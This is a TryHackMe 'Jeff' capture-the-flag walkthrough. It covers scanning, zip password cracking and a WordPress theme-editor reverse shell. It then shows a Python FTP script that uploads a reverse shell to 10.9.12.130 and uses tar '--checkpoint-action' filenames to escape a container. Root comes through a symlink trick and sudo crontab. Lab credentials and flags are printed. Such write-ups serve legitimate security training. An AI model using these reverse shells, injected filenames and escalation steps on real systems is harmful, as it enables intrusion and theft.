> Jeff

# Nmap

nmap -sC -sV -T4 -A -Pn -vv -p- -oN nmap/initial $IP

```bash
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg4z+/foDFEWvhoIYbCJR1YFXJSwUz3Tg4eFCje6gUXuRlCbi+AFLKT7Z7YeukAOdGfucg+sDdVG1Uay2MmT0YcWpPaWgJUmeHP3u3fYzwXgc2hwrHag+VTuuRM8zwwyR6gjRFIv1F9zTSPJBCkCWIHulcklArT8OMWLdKVCNK3B8ml92yUIA3HqnsN4DlGOTbYkpKd1G33zYNTXDDPwSi2N29rxWYdfRIJGjGfVT+EXFzccLtK+n+BJqsislTXv7h2Xi2aAJhw66RjBLoopu86ugdayaBb/Wfc1x1vQXAJAnAO02GPKueq/IzFUYGh/dlci7VG1qTz217chshXTqX
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNCLV+aPDHn2ot0aIXSYrRbvARScbRpkGp+hjzAI2iInTc6jgb7GooapeEZOpacn4zFpsI/PR8wwA2QhYXi3aNE=
|   256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx35hakinwovxQnAWprmEBqZNVlj7JjrZO1WxDc/RF/
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Gobuster

gobuster dir -u http://jeff.thm -w /usr/share/wordlists/dirb/common.txt -x php,aspx,jsp,html,js,txt -o gobuster/initial

```bash
/admin                (Status: 301) [Size: 178] [--> http://jeff.thm/admin/]
/assets               (Status: 301) [Size: 178] [--> http://jeff.thm/assets/]
/backups              (Status: 301) [Size: 178] [--> http://jeff.thm/backups/]
/uploads               (Status: 301) [Size: 178] [--> http://jeff.thm/uploads/]
/index.html           (Status: 200) [Size: 1178]                              
/index.html           (Status: 200) [Size: 1178]
[08:06:35] 301 -  178B  - /source_codes  ->  http://jeff.thm/source_codes/
```

Since `backups` is the most interesting one I ran dirbuster again!

gobuster dir -u http://jeff.thm/backups -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,aspx,jsp,html,js,txt,zip,bak -o gobuster/backups -q

```bash
/backup.zip           (Status: 200) [Size: 62753]
```

I tried to unzip the backup file but it requres password. I used fcrackzip to crack zip password.

fcrackzip -uvDp /usr/share/wordlists/rockyou.txt backup.zip

```
PASSWORD FOUND!!!!: pw == !!Burningbird!!
```

And unzipping it we got a file named `wpadmin.bak `

```
wordpress password is: phO#g)C5dhIWZn3BKP
```

# vhosts bruteforcing

gobuster vhost -u jeff.thm --wordlist /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

```bash
Found: wordpress.jeff.thm (Status: 200) [Size: 25901]
```

Investigating `jeff.thm`. /backups gives us only one entry `jeff.thm`.And `/uploads` looks like it redirects only and nothing happens. I moved onto `wordpress.jeff.thm`.

# Wpscan

wpscan --url http://wordpress.jeff.thm -e ap,at,u,dbe

```bash
[+] WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 1.7
[+] twentynineteen
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentynineteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.0
[+] twentyseventeen
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

We have an username jeff and we already have a password. We can login now as jeff! i used twentyseventeen theme editor and updated 404.php with our reverse shell and called `http://wordpress.jeff.thm/wp-content/themes/twentyseventeen/404.php` and got a shell as www-data.


I 1'st check /var/www/html and `ftp_backup.php` caught my eyes.

```php
<?php
/* 
    Todo: I need to finish coding this database backup script.
	  also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 
```

We got ftp creds for user backupmgr. But in our shell we can't switch users. So we have to do it using pyton in the remote machine. And we can access ftp only locally. We got 

```bash
curl -v -s -P- 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'

* Connection #0 to host 172.20.0.1 left intact
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files
```

So now we can write a python script to upload a python reverse shell to /files. So when the connection is established we can escape the container.

```py
#!/usr/bin/env python3.7

from ftplib import FTP
import io

#Connecting to the host
ftp = FTP(host= '172.20.0.1')

#login for ftp user
ftp.login(user= "backupmgr", passwd= "SuperS1ckP4ssw0rd123!")
ftp.getwelcome()

ftp.set_pasv(False)
ftp.dir()
ftp.cwd('/files')

payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.12.130",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')
empty = io.BytesIO(b'')

ftp.storlines('STOR exploit.sh', payload)
ftp.storlines('STOR --checkpoint=1', empty)
ftp.storlines('STOR --checkpoint-action=exec=sh exploit.sh', empty)

ftp.quit()
```

After 2 mins we get our shell as `backupmgr`. Let's find files for jeff.

find / -user jeff 2>/dev/null

```bash
/opt/systools
/opt/systools/systool
/home/jeff
/var/backups/jeff.bak
```

We can't access jeff.bak. And Next I moved onto `systools`. And there we got `message.txt`

```
Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```

And running `systools` elf file.

```bash
./systool 
Welcome to Jeffs System Administration tool.
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2


Jeff, you should login with your own account to view/change your password. I hope you haven't forgotten it.
```

But I really wan4t to view jeff.bak. I can delete `message.txt` and link `jeff.bak` to view the contents.

```bash
rm messae.txt
ln -s /var/backups/jeff.bak message.txt
./systool
This is still a very beta version and some things are not implemented yet.
Please Select an option from below.
1 ) View process information.
2 ) Restore your password.
3 ) Exit 
Chose your option: 2


Your Password is: 123-My-N4M3-1z-J3ff-123 
```

I ssh'd into as jeff. But I have rbash. Whatt!! Ok The I su'd in the prev. rev shell as jeff and cat the contents of user flag.

# user.txt

```
THM{HashMeLikeOneOfYourFrenchGirls}
THM{e122d5588956ef9ba7d4d2b2fee00cac}
```

We can use `ssh jeff@jeff.thm -t "bash --noprofile"` to come out of rbash.

# Priv. Esc

sudo -l

```bash
User jeff may run the following commands on tryharder:
    (ALL) /usr/bin/crontab
```

# GTFO

```bash
sudo /usr/bin/crontab -e
:!/bin/bash
```

And we are root!

# root.txt

```
THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}
```